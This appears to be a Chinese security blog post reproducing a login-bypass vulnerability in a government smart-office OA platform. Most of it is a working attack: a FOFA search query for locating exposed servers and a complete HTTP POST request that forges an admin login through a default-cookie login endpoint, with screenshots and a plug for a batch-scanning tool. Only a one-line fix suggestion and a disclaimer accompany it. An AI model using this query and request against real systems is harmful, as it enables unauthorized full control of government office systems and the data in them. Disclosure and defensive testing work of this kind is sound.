#  【漏洞复现】数字通云平台智慧政务cookie登录绕过漏洞   
原创 清风  白帽攻防   2024-11-21 01:22  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
数字通云平台的智慧政务OA产品，依托云计算、大数据和人工智能等前沿技术，专为政府部门设计，旨在提升办公效率、协作能力和信息共享水平，推动电子政务向更高层次的发展。  
由中科数字通（北京）科技有限公司研发的这套全新智慧办公系统，包含了9大类、50多个核心功能模块，致力于为政府机关提供先进的协同办公解决方案。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eMbALDmrUvoabgUricXz6ChH0pepuF0BKHqIC6tCNmwG1pI8m3wbZjSGoQj3zVlLqI2yBuRcU2VBA/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞描述  
  
数字通云平台的智慧政务系统存在登录绕过漏洞，在OA系统的login接口中存在未授权访问默认cookie的风险，未经身份验证的远程攻击者可利用此漏洞伪造登录，从而获得对系统的完全控制权限。  
fofa语法```
body="assets/8cca19ff/css/bootstrap-yii.css"
```  
漏洞复现```
POST /portal/default/login HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
   
userID=admin&flag=rone
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eMbALDmrUvoabgUricXz6CheT7F9SqIsuxJEKkdYFLI6eaduVdSOd3ocB2dur2cYvYOp0r5pEW03Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eMbALDmrUvoabgUricXz6ChFcGRZQo3H2lictWFL5k6ziaHP4ia4rGjcYxxyI1qkpWLhic7ZA5yepGxwQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eMbALDmrUvoabgUricXz6ChM6TQpOKEF1DuQPpJnaXa3MtOcw3jdKFbDicuSywrRmdwHwicKmPvn4Xw/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eMbALDmrUvoabgUricXz6ChokxTamW1w0uGGbJZS05ZXPxa0vIzfZI43WVgzHMBZRJPBcGyLjU0mg/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
  
禁用默认获取cookie接口  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
